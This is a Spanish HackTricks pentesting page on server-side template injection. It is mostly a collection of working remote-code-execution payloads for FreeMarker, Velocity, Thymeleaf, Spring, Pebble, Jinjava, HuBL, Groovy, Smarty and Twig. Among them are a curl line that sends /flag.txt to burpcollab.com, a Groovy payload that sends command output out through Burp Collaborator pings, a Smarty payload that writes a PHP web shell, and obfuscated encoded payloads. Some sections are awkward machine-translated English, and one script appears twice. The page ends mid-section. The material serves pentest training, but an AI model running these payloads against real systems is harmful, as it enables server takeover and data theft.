# SSTI (Inyecci√≥n de Plantillas en el Lado del Servidor)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (3).png" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com) es el evento de ciberseguridad m√°s relevante en **Espa√±a** y uno de los m√°s importantes en **Europa**. Con **la misi√≥n de promover el conocimiento t√©cnico**, este congreso es un punto de encuentro para profesionales de la tecnolog√≠a y la ciberseguridad en todas las disciplinas.

{% embed url="https://www.rootedcon.com/" %}

## ¬øQu√© es la inyecci√≥n de plantillas en el lado del servidor?

La inyecci√≥n de plantillas en el lado del servidor ocurre cuando un atacante es capaz de utilizar la sintaxis nativa de las plantillas para inyectar una carga maliciosa en una plantilla, que luego se ejecuta en el lado del servidor.

Los **motores de plantillas** est√°n dise√±ados para **generar p√°ginas web** combinando plantillas **fijas** con datos **vol√°tiles**. Los ataques de inyecci√≥n de plantillas en el lado del servidor pueden ocurrir cuando la **entrada del usuario** se concatena directamente **en una plantilla**, en lugar de pasarla como datos. Esto permite a los atacantes **inyectar directivas de plantilla arbitrarias** para manipular el motor de plantillas, lo que a menudo les permite tomar **control completo del servidor**.

Un ejemplo de c√≥digo vulnerable se muestra a continuaci√≥n:
```php
$output = $twig->render("Dear " . $_GET['name']);
```
En el ejemplo anterior, **parte de la plantilla** en s√≠ se est√° **generando din√°micamente** utilizando el par√°metro `GET` llamado `name`. Dado que la sintaxis de la plantilla se eval√∫a en el servidor, esto potencialmente permite a un atacante insertar una carga √∫til de inyecci√≥n de plantilla en el lado del servidor dentro del par√°metro `name` de la siguiente manera:
```
http://vulnerable-website.com/?name={{bad-stuff-here}}
```
## Construyendo un ataque de inyecci√≥n de plantillas en el lado del servidor

![](../../.gitbook/assets/ssti-methodology-diagram.png)

### Detectar

Como con cualquier vulnerabilidad, el primer paso hacia la explotaci√≥n es poder encontrarla. Quiz√°s el enfoque inicial m√°s simple sea intentar **fuzzear la plantilla** inyectando una secuencia de caracteres especiales com√∫nmente utilizados en expresiones de plantillas, como el pol√≠glota **`${{<%[%'"}}%\`.**\
Para comprobar si el servidor es vulnerable, debes **detectar las diferencias** entre la respuesta con **datos regulares** en el par√°metro y la **carga √∫til proporcionada**.\
Si se produce un **error**, ser√° bastante f√°cil darse cuenta de que **el servidor es vulnerable** e incluso qu√© **motor se est√° ejecutando**. Pero tambi√©n podr√≠as encontrar un servidor vulnerable si esperabas que reflejara la carga √∫til proporcionada y no lo est√° haciendo, o si hay algunos caracteres **faltantes** en la respuesta.

**Detectar - Contexto de texto sin formato**

La entrada proporcionada se est√° **renderizando y reflejando** en la respuesta. Esto f√°cilmente se puede **confundir con una vulnerabilidad** [**XSS**](../xss-cross-site-scripting/) simple, pero es f√°cil diferenciarlo si intentas establecer **operaciones matem√°ticas** dentro de una expresi√≥n de plantilla:
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```
**Detectar - Contexto del c√≥digo**

En estos casos, la **entrada del usuario** se coloca **dentro de** una **expresi√≥n de plantilla**:
```python
engine.render("Hello {{"+greeting+"}}", data)
```
La URL para acceder a esa p√°gina podr√≠a ser similar a: `http://vulnerable-website.com/?greeting=data.username`

Si **cambias** el par√°metro **`greeting`** por un **valor diferente**, la **respuesta no contendr√° el nombre de usuario**, pero si accedes a algo como: `http://vulnerable-website.com/?greeting=data.username}}hello`, entonces **la respuesta contendr√° el nombre de usuario** (si los caracteres de cierre de la expresi√≥n de la plantilla fueron **`}}`**).\
Si se produce un **error** durante estas pruebas, ser√° m√°s f√°cil encontrar que el servidor es vulnerable.

### Identificar

Una vez que hayas detectado el potencial de inyecci√≥n de plantillas, el siguiente paso es identificar el motor de plantillas.\
Aunque hay una gran cantidad de lenguajes de plantillas, muchos de ellos utilizan una sintaxis muy similar que se elige espec√≠ficamente para no chocar con los caracteres HTML.

Si tienes suerte, el servidor estar√° **imprimiendo los errores** y podr√°s encontrar el **motor** utilizado **dentro** de los errores. Algunos payloads posibles que pueden causar errores son:

| `${}`       | `{{}}`       | `<%= %>`        |
| ----------- | ------------ | --------------- |
| `${7/0}`    | `{{7/0}}`    | `<%= 7/0 %>`    |
| `${foobar}` | `{{foobar}}` | `<%= foobar %>` |
| `${7*7}`    | `{{7*7}}`    | \`\`            |

De lo contrario, deber√°s probar manualmente diferentes payloads espec√≠ficos del lenguaje y estudiar c√≥mo son interpretados por el motor de plantillas. Una forma com√∫n de hacer esto es inyectar operaciones matem√°ticas arbitrarias utilizando la sintaxis de diferentes motores de plantillas. Luego puedes observar si se eval√∫an correctamente. Para ayudar en este proceso, puedes utilizar un √°rbol de decisiones similar al siguiente:

![](<../../.gitbook/assets/image (272).png>)

### Explotar

**Leer**

El primer paso despu√©s de encontrar la inyecci√≥n de plantillas e identificar el motor de plantillas es leer la documentaci√≥n. Las √°reas clave de inter√©s son:

* Secciones 'Para autores de plantillas' que cubren la sintaxis b√°sica.
* 'Consideraciones de seguridad': es probable que quien desarroll√≥ la aplicaci√≥n que est√°s probando no haya le√≠do esto, y puede contener algunas pistas √∫tiles.
* Listas de m√©todos, funciones, filtros y variables integradas.
* Listas de extensiones/plugins: algunos pueden estar habilitados de forma predeterminada.

**Explorar**

Suponiendo que no se hayan presentado exploits, el siguiente paso es **explorar el entorno** para descubrir exactamente a qu√© **tienes acceso**. Puedes esperar encontrar tanto **objetos predeterminados** proporcionados por el motor de plantillas, como **objetos espec√≠ficos de la aplicaci√≥n** pasados a la plantilla por el desarrollador. Muchos sistemas de plantillas exponen un objeto 'self' o de espacio de nombres que contiene todo en el √°mbito, y una forma idiom√°tica de listar los atributos y m√©todos de un objeto.

Si no hay un objeto self incorporado, tendr√°s que probar nombres de variables mediante [SecLists](https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt) y la colecci√≥n de listas de palabras de Burp Intruder.

Los objetos proporcionados por el desarrollador son particularmente propensos a contener informaci√≥n sensible, y pueden variar entre diferentes plantillas dentro de una aplicaci√≥n, por lo que este proceso idealmente debe aplicarse a cada plantilla individualmente.

**Atacar**

En este punto, deber√≠as tener una **idea clara de la superficie de ataque** disponible y poder proceder con t√©cnicas tradicionales de auditor√≠a de seguridad, revisando cada funci√≥n en busca de vulnerabilidades explotables. Es importante abordar esto en el contexto de la aplicaci√≥n en general: algunas funciones se pueden utilizar para explotar caracter√≠sticas espec√≠ficas de la aplicaci√≥n. Los ejemplos a continuaci√≥n utilizar√°n la inyecci√≥n de plantillas para desencadenar la creaci√≥n arbitraria de objetos, la lectura/escritura arbitraria de archivos, la inclusi√≥n remota de archivos, la divulgaci√≥n de informaci√≥n y las vulnerabilidades de escalada de privilegios.

## Herramientas

### [Tplmap](https://github.com/epinna/tplmap)
```python
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```
## Exploits

### Gen√©rico

En esta **lista de palabras** puedes encontrar **variables definidas** en los entornos de algunos de los motores mencionados a continuaci√≥n:

* [https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt)

### Java

**Java - Inyecci√≥n b√°sica**
```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
```
**Java - Obtener las variables de entorno del sistema**

En algunas situaciones de pentesting, puede ser √∫til obtener las variables de entorno del sistema en el que se est√° realizando la prueba. Esto puede proporcionar informaci√≥n valiosa sobre la configuraci√≥n y el entorno del sistema objetivo.

En Java, se puede acceder a las variables de entorno del sistema utilizando la clase `System` y el m√©todo `getenv()`. Este m√©todo devuelve un objeto `Map` que contiene todas las variables de entorno del sistema y sus valores correspondientes.

A continuaci√≥n se muestra un ejemplo de c√≥mo recuperar las variables de entorno del sistema en Java:

```java
import java.util.Map;

public class SystemEnvVariables {
    public static void main(String[] args) {
        Map<String, String> envVariables = System.getenv();

        for (Map.Entry<String, String> entry : envVariables.entrySet()) {
            System.out.println(entry.getKey() + " = " + entry.getValue());
        }
    }
}
```

Este c√≥digo imprimir√° todas las variables de entorno del sistema y sus valores correspondientes en la consola.

Es importante tener en cuenta que, en un entorno de producci√≥n, acceder a las variables de entorno del sistema puede ser un riesgo de seguridad. Por lo tanto, se recomienda utilizar esta t√©cnica solo en entornos controlados y con el permiso adecuado.
```java
${T(java.lang.System).getenv()}
```
**Java - Obtener /etc/passwd**

```java
import java.io.*;

public class SSTI {
    public static void main(String[] args) throws IOException {
        String command = "cat /etc/passwd";
        Process process = Runtime.getRuntime().exec(command);
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            System.out.println(line);
        }
        reader.close();
    }
}
```

Este c√≥digo Java muestra c√≥mo obtener el contenido del archivo `/etc/passwd`. El programa utiliza el m√©todo `Runtime.getRuntime().exec()` para ejecutar el comando `cat /etc/passwd` en el sistema operativo subyacente. Luego, lee la salida del comando l√≠nea por l√≠nea y la imprime en la consola.
```java
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
### FreeMarker (Java)

Puedes probar tus payloads en [https://try.freemarker.apache.org](https://try.freemarker.apache.org)

* `{{7*7}} = {{7*7}}`
* `${7*7} = 49`
* `#{7*7} = 49 -- (legacy)`
* `${7*'7'} Nada`
* `${foobar}`
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```
**Freemarker - Bypass de la caja de arena**

‚ö†Ô∏è solo funciona en versiones de Freemarker anteriores a 2.3.30
```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```
**M√°s informaci√≥n**

* En la secci√≥n de FreeMarker de [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker)

### Velocity (Java)
```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```
**M√°s informaci√≥n**

* En la secci√≥n Velocity de [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity)

### Thymeleaf (Java)

La expresi√≥n de prueba t√≠pica para SSTI es `${7*7}`. Esta expresi√≥n tambi√©n funciona en Thymeleaf. Si deseas lograr la ejecuci√≥n remota de c√≥digo, puedes usar una de las siguientes expresiones de prueba:

* SpringEL: `${T(java.lang.Runtime).getRuntime().exec('calc')}`
* OGNL: `${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}`

Sin embargo, como mencionamos anteriormente, las expresiones solo funcionan en atributos especiales de Thymeleaf. Si es necesario utilizar una expresi√≥n en una ubicaci√≥n diferente en la plantilla, Thymeleaf admite _inline expressions_. Para utilizar esta funci√≥n, debes colocar una expresi√≥n dentro de `[[...]]` o `[(...)]` (selecciona uno u otro dependiendo de si necesitas escapar s√≠mbolos especiales). Por lo tanto, una carga √∫til de detecci√≥n simple de SSTI para Thymeleaf ser√≠a `[[${7*7}]]`.

Sin embargo, las posibilidades de que la carga √∫til de detecci√≥n anterior funcione son muy bajas. Las vulnerabilidades de SSTI generalmente ocurren cuando una plantilla se genera din√°micamente en el c√≥digo. Thymeleaf, por defecto, no permite tales plantillas generadas din√°micamente y todas las plantillas deben crearse previamente. Por lo tanto, si un desarrollador desea crear una plantilla a partir de una cadena _sobre la marcha_, deber√≠a crear su propio TemplateResolver. Esto es posible, pero ocurre muy raramente.

Si examinamos m√°s a fondo la documentaci√≥n del motor de plantillas Thymeleaf, encontraremos una caracter√≠stica interesante llamada _**preprocesamiento de expresiones**_. Las expresiones colocadas entre doble gui√≥n bajo (`__...__`) se preprocesan y el resultado del preprocesamiento se utiliza como parte de la expresi√≥n durante el procesamiento regular. Aqu√≠ tienes un ejemplo oficial de la documentaci√≥n de Thymeleaf:
```java
#{selection.__${sel.code}__}
```
**Ejemplo vulnerable**
```markup
<a th:href="@{__${path}__}" th:title="${title}">
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>

http://localhost:8082/(7*7)
http://localhost:8082/(${T(java.lang.Runtime).getRuntime().exec('calc')})
```
**M√°s informaci√≥n**

* [https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Framework Spring (Java)
```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```
**Bypassar filtros**

Se pueden usar m√∫ltiples expresiones de variables, si `${...}` no funciona, prueba con `#{...}`, `*{...}`, `@{...}` o `~{...}`.

* Leer `/etc/passwd`
```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
* Script personalizado para generar payloads

```python
import requests

def generate_payload(template, code):
    payload = template.replace('{{code}}', code)
    return payload

def send_payload(payload, url):
    response = requests.post(url, data=payload)
    return response.text

template = '''
{{code}}
'''

code = '''
import os
os.system('whoami')
'''

payload = generate_payload(template, code)
url = 'http://example.com'
response = send_payload(payload, url)
print(response)
```

Este script personalizado genera payloads para inyecciones de c√≥digo en el lado del servidor.

```python
import requests

def generate_payload(template, code):
    payload = template.replace('{{code}}', code)
    return payload

def send_payload(payload, url):
    response = requests.post(url, data=payload)
    return response.text

template = '''
{{code}}
'''

code = '''
import os
os.system('whoami')
'''

payload = generate_payload(template, code)
url = 'http://example.com'
response = send_payload(payload, url)
print(response)
```

This custom script generates payloads for server-side template injections.
```python
#!/usr/bin/python3

## Written By Zeyad Abulaban (zAbuQasem)
# Usage: python3 gen.py "id"

from sys import argv

cmd = list(argv[1].strip())
print("Payload: ", cmd , end="\n\n")
converted = [ord(c) for c in cmd]
base_payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec'
end_payload = '.getInputStream())}'

count = 1
for i in converted:
if count == 1:
base_payload += f"(T(java.lang.Character).toString({i}).concat"
count += 1
elif count == len(converted):
base_payload += f"(T(java.lang.Character).toString({i})))"
else:
base_payload += f"(T(java.lang.Character).toString({i})).concat"
count += 1

print(base_payload + end_payload)
```
**M√°s informaci√≥n**

* [Thymleaf SSTI](https://javamana.com/2021/11/20211121071046977B.html)
* [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---retrieve-etcpasswd)

### Manipulaci√≥n de vistas de Spring (Java)
```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
```
* [https://github.com/veracode-research/spring-view-manipulation](https://github.com/veracode-research/spring-view-manipulation)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Pebble (Java)

* `{{ someString.toUPPERCASE() }}`

Versi√≥n antigua de Pebble ( < versi√≥n 3.0.9):
```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
```
Nueva versi√≥n de Pebble:
```java
{% raw %}
{% set cmd = 'id' %}
{% endraw %}


{% set bytes = (1).TYPE
.forName('java.lang.Runtime')
.methods[6]
.invoke(null,null)
.exec(cmd)
.inputStream
.readAllBytes() %}
{{ (1).TYPE
.forName('java.lang.String')
.constructors[0]
.newInstance(([bytes]).toArray()) }}
```
### Jinjava (Java)

Jinjava is a powerful and flexible template engine for Java applications. It allows you to dynamically generate HTML, XML, JSON, and other types of documents by combining templates with data. Jinjava supports a wide range of features, including conditionals, loops, filters, and macros, making it a versatile tool for server-side template injection (SSTI) attacks.

#### Exploiting SSTI with Jinjava

To exploit SSTI vulnerabilities in applications that use Jinjava, you need to identify injection points where user-supplied input is directly included in the template. These injection points can be found in various places, such as URL parameters, form inputs, or database queries.

Once you have identified an injection point, you can craft a payload that will be executed as Jinjava code. This payload can include Jinjava expressions, variables, and functions to manipulate the template and execute arbitrary code on the server.

For example, consider the following vulnerable code snippet:

```java
String template = request.getParameter("template");
String rendered = Jinjava.render(template);
response.getWriter().write(rendered);
```

In this code, the `template` parameter is directly passed to the `Jinjava.render()` method, making it susceptible to SSTI attacks. An attacker can exploit this vulnerability by injecting Jinjava code into the `template` parameter, leading to code execution on the server.

#### Preventing SSTI Attacks

To prevent SSTI attacks in applications that use Jinjava, it is important to properly sanitize and validate user input before including it in templates. Here are some best practices to follow:

- Use a whitelist approach: Only allow specific safe expressions, variables, and functions to be used in templates.
- Implement input validation: Validate user input to ensure it meets the expected format and does not contain any malicious code.
- Use context-aware escaping: Escape user input based on its context in the template to prevent code injection.
- Keep Jinjava up to date: Regularly update Jinjava to benefit from the latest security patches and bug fixes.

By following these best practices, you can mitigate the risk of SSTI vulnerabilities in your applications and protect them from potential attacks.
```java
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
```
Jinjava es un proyecto de c√≥digo abierto desarrollado por Hubspot, disponible en [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)

**Jinjava - Ejecuci√≥n de comandos**

Solucionado por [https://github.com/HubSpot/jinjava/pull/230](https://github.com/HubSpot/jinjava/pull/230)
```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```
**M√°s informaci√≥n**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava)

### Hubspot - HuBL (Java)

* Delimitadores de declaraci√≥n `{% %}`
* Delimitadores de expresi√≥n `{{ }}`
* Delimitadores de comentario `{# #}`
* `{{ request }}` - com.hubspot.content.hubl.context.TemplateContextRequest@23548206
* `{{'a'.toUpperCase()}}` - "A"
* `{{'a'.concat('b')}}` - "ab"
* `{{'a'.getClass()}}` - java.lang.String
* `{{request.getClass()}}` - class com.hubspot.content.hubl.context.TemplateContextRequest
* `{{request.getClass().getDeclaredMethods()[0]}}` - public boolean com.hubspot.content.hubl.context.TemplateContextRequest.isDebug()

Busqu√© "com.hubspot.content.hubl.context.TemplateContextRequest" y descubr√≠ el [proyecto Jinjava en Github](https://github.com/HubSpot/jinjava/).
```java
{{request.isDebug()}}
//output: False

//Using string 'a' to get an instance of class sun.misc.Launcher
{{'a'.getClass().forName('sun.misc.Launcher').newInstance()}}
//output: sun.misc.Launcher@715537d4

//It is also possible to get a new object of the Jinjava class
{{'a'.getClass().forName('com.hubspot.jinjava.JinjavaConfig').newInstance()}}
//output: com.hubspot.jinjava.JinjavaConfig@78a56797

//It was also possible to call methods on the created object by combining the







{% raw %}
{% %} and {{ }} blocks
{% set ji='a'.getClass().forName('com.hubspot.jinjava.Jinjava').newInstance().newInterpreter() %}
{% endraw %}


{{ji.render('{{1*2}}')}}
//Here, I created a variable 'ji' with new instance of com.hubspot.jinjava.Jinjava class and obtained reference to the newInterpreter method. In the next block, I called the render method on 'ji' with expression {{1*2}}.

//{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
//output: xxx

//RCE
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
//output: java.lang.UNIXProcess@1e5f456e

//RCE with org.apache.commons.io.IOUtils.
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//output: netstat execution

//Multiple arguments to the commands
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//Output: Linux bumpy-puma 4.9.62-hs4.el6.x86_64 #1 SMP Fri Jun 1 03:00:47 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```
**M√°s informaci√≥n**

* [https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)

### Lenguaje de Expresi√≥n - EL (Java)

* `${"aaaa"}` - "aaaa"
* `${99999+1}` - 100000.
* `#{7*7}` - 49
* `${{7*7}}` - 49
* `${{request}}, ${{session}}, {{faceContext}}`

EL proporciona un mecanismo importante para permitir que la capa de presentaci√≥n (p√°ginas web) se comunique con la l√≥gica de la aplicaci√≥n (beans administrados). EL es utilizado por **varias tecnolog√≠as de JavaEE**, como la tecnolog√≠a JavaServer Faces, la tecnolog√≠a JavaServer Pages (JSP) y la Inyecci√≥n de Dependencias y Contextos para Java EE (CDI).\
Consulte la siguiente p√°gina para obtener m√°s informaci√≥n sobre la **explotaci√≥n de int√©rpretes EL**:

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Groovy (Java)

Este bypass del Administrador de Seguridad fue tomado de este [**informe**](https://security.humanativaspa.it/groovy-template-engine-exploitation-notes-from-a-real-case-scenario/).
```java
//Basic Payload
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "ping cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net "
assert java.lang.Runtime.getRuntime().exec(cmd.split(" "))
})
def x

//Payload to get output
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "whoami";
out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net";
java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
})
def x

//Other payloads
new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x")
this.evaluate(new String(java.util.Base64.getDecoder().decode("QGdyb292eS50cmFuc2Zvcm0uQVNUVGVzdCh2YWx1ZT17YXNzZXJ0IGphdmEubGFuZy5SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJpZCIpfSlkZWYgeA==")))
this.evaluate(new String(new byte[]{64, 103, 114, 111, 111, 118, 121, 46, 116, 114, 97, 110, 115, 102, 111, 114, 109, 46, 65, 83, 84, 84, 101, 115, 116, 40, 118, 97, 108, 117, 101, 61, 123, 97, 115, 115, 101, 114, 116, 32, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101, 46, 103, 101, 116, 82,117, 110, 116, 105, 109, 101, 40, 41, 46, 101, 120, 101, 99, 40, 34, 105, 100, 34, 41, 125, 41, 100, 101, 102, 32, 120}))
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) es el evento de ciberseguridad m√°s relevante en **Espa√±a** y uno de los m√°s importantes en **Europa**. Con **la misi√≥n de promover el conocimiento t√©cnico**, este congreso es un punto de encuentro vibrante para profesionales de la tecnolog√≠a y la ciberseguridad en todas las disciplinas.

{% embed url="https://www.rootedcon.com/" %}

##

### Smarty (PHP)
```php
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
```
**M√°s informaci√≥n**

* En la secci√≥n de Smarty de [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty)

### Twig (PHP)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{7*'7'}} = 49`
* `{{1/0}} = Error`
* `{{foobar}} Nada`
```python
#Get Info
{{_self}} #(Ref. to current application)
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}

#File read
"{{'/etc/passwd'|file_excerpt(1,30)}}"@

#Exec code
